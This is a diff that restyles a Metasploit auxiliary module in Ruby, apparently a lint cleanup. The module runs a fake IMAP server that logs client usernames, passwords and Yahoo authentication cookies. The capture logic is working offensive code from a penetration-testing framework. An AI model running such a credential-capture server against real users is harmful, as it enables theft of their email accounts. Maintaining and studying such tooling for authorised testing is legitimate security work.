@@ -9,29 +9,33 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'        => 'Authentication Capture: IMAP',
-      'Description'    => %q{
+      'Name' => 'Authentication Capture: IMAP',
+      'Description' => %q{
         This module provides a fake IMAP service that
       is designed to capture authentication credentials.
       },
-      'Author'      => ['ddz', 'hdm'],
-      'License'     => MSF_LICENSE,
-      'Actions'     =>
-        [
-          [ 'Capture', 'Description' => 'Run IMAP capture server' ]
-        ],
-      'PassiveActions' =>
-        [
-          'Capture'
-        ],
-      'DefaultAction'  => 'Capture'
+      'Author' => ['ddz', 'hdm'],
+      'License' => MSF_LICENSE,
+      'Actions' => [
+        [ 'Capture', { 'Description' => 'Run IMAP capture server' } ]
+      ],
+      'PassiveActions' => [
+        'Capture'
+      ],
+      'DefaultAction' => 'Capture',
+      'Notes' => {
+        'Stability' => [CRASH_SAFE],
+        'SideEffects' => [],
+        'Reliability' => []
+      }
     )
 
     register_options(
       [
-        OptPort.new('SRVPORT',  [ true, "The local port to listen on.", 143 ]),
-        OptString.new('BANNER', [ true, "The server banner",  'IMAP4'])
-      ])
+        OptPort.new('SRVPORT', [ true, 'The local port to listen on.', 143 ]),
+        OptString.new('BANNER', [ true, 'The server banner', 'IMAP4'])
+      ]
+    )
   end
 
   def setup
@@ -40,17 +44,18 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-    exploit()
+    exploit
   end
 
-  def on_client_connect(c)
-    @state[c] = {:name => "#{c.peerhost}:#{c.peerport}", :ip => c.peerhost, :port => c.peerport, :user => nil, :pass => nil}
-    c.put "* OK #{datastore['BANNER']}\r\n"
+  def on_client_connect(client)
+    @state[client] = { name: "#{client.peerhost}:#{client.peerport}", ip: client.peerhost, port: client.peerport, user: nil, pass: nil }
+    client.put "* OK #{datastore['BANNER']}\r\n"
   end
 
-  def on_client_data(c)
-    data = c.get_once
+  def on_client_data(client)
+    data = client.get_once
     return unless data
+
     num, cmd, arg = data.strip.split(/\s+/, 3)
     cmd ||= ''
     arg ||= ''
@@ -61,14 +66,14 @@ class MetasploitModule < Msf::Auxiliary
     if arg.chomp =~ /\{[0-9]+\}$/
       loop do
         # Ask for more data
-        c.put "+ \r\n"
+        client.put "+ \r\n"
 
         # Get the next line
-        arg = (c.get_once || '').chomp
+        arg = (client.get_once || '').chomp
 
         # Remove the length field, if there is one
         if arg =~ /(.*) \{[0-9]+\}$/
-          args << $1
+          args << ::Regexp.last_match(1)
         else
           # If there's no length field, we're at the end
           args << arg
@@ -81,52 +86,52 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     if cmd.upcase == 'CAPABILITY'
-      c.put "* CAPABILITY IMAP4 IMAP4rev1 IDLE LOGIN-REFERRALS " +
-        "MAILBOX-REFERRALS NAMESPACE LITERAL+ UIDPLUS CHILDREN UNSELECT " +
-        "QUOTA XLIST XYZZY LOGIN-REFERRALS AUTH=XYMCOOKIE AUTH=XYMCOOKIEB64 " +
-        "AUTH=XYMPKI AUTH=XYMECOOKIE ID\r\n"
-      c.put "#{num} OK CAPABILITY completed.\r\n"
+      client.put '* CAPABILITY IMAP4 IMAP4rev1 IDLE LOGIN-REFERRALS ' \
+            'MAILBOX-REFERRALS NAMESPACE LITERAL+ UIDPLUS CHILDREN UNSELECT ' \
+            'QUOTA XLIST XYZZY LOGIN-REFERRALS AUTH=XYMCOOKIE AUTH=XYMCOOKIEB64 ' \
+            "AUTH=XYMPKI AUTH=XYMECOOKIE ID\r\n"
+      client.put "#{num} OK CAPABILITY completed.\r\n"
     end
 
     # Handle attempt to authenticate using Yahoo's magic cookie
     # Used by iPhones and Zimbra
     if cmd.upcase == 'AUTHENTICATE' && arg.upcase == 'XYMPKI'
-      c.put "+ \r\n"
-      cookie1 = c.get_once
-      c.put "+ \r\n"
-      cookie2 = c.get_once
-      register_creds(@state[c][:ip], cookie1, cookie2, 'imap-yahoo')
+      client.put "+ \r\n"
+      cookie1 = client.get_once
+      client.put "+ \r\n"
+      cookie2 = client.get_once
+      register_creds(@state[client][:ip], cookie1, cookie2, 'imap-yahoo')
       return
     end
 
     if cmd.upcase == 'LOGIN'
-      @state[c][:user], @state[c][:pass] = args
-      register_creds(@state[c][:ip], @state[c][:user], @state[c][:pass], 'imap')
-      print_good("IMAP LOGIN #{@state[c][:name]} #{@state[c][:user]} / #{@state[c][:pass]}")
+      @state[client][:user], @state[client][:pass] = args
+      register_creds(@state[client][:ip], @state[client][:user], @state[client][:pass], 'imap')
+      print_good("IMAP LOGIN #{@state[client][:name]} #{@state[client][:user]} / #{@state[client][:pass]}")
 
       return
     end
 
     if cmd.upcase == 'LOGOUT'
-      c.put("* BYE IMAP4rev1 Server logging out\r\n")
-      c.put("#{num} OK LOGOUT completed\r\n")
+      client.put("* BYE IMAP4rev1 Server logging out\r\n")
+      client.put("#{num} OK LOGOUT completed\r\n")
       return
     end
 
     if cmd.upcase == 'ID'
       # RFC2971 specifies the ID command, and `NIL` is a valid response
-      c.put("* ID NIL\r\n")
-      c.put("#{num} OK ID completed\r\n")
+      client.put("* ID NIL\r\n")
+      client.put("#{num} OK ID completed\r\n")
       return
     end
 
-    @state[c][:pass] = data.strip
-    c.put "#{num} NO LOGIN FAILURE\r\n"
+    @state[client][:pass] = data.strip
+    client.put "#{num} NO LOGIN FAILURE\r\n"
     return
   end
 
-  def on_client_close(c)
-    @state.delete(c)
+  def on_client_close(client)
+    @state.delete(client)
   end
 
   def register_creds(client_ip, user, pass, service_name)
@@ -142,7 +147,7 @@ class MetasploitModule < Msf::Auxiliary
     # Build credential information
     credential_data = {
       origin_type: :service,
-      module_fullname: self.fullname,
+      module_fullname: fullname,
       private_data: pass,
       private_type: :password,
       username: user,
